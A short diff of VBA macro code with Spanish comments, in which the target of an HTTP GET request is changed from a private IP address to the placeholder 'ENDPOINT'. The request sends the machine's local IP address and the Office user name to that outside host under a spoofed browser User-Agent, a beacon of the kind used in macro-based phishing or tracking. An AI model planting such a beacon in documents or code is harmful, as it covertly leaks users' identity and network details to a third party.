@@ -57,7 +57,7 @@ Set RegEx = Nothing
 ' Definimos una URL de destino donde enviaremos las peticiones GET
 ' Le encolamos la ip en la query string y el user name
 
-        Url = "http://192.168.1.63/?IP=" & ipLocal & "UserName=" & Application.UserName
+        Url = "http://ENDPOINT/?IP=" & ipLocal & "UserName=" & Application.UserName
         objHTTP.Open "GET", Url, False
         objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
         objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
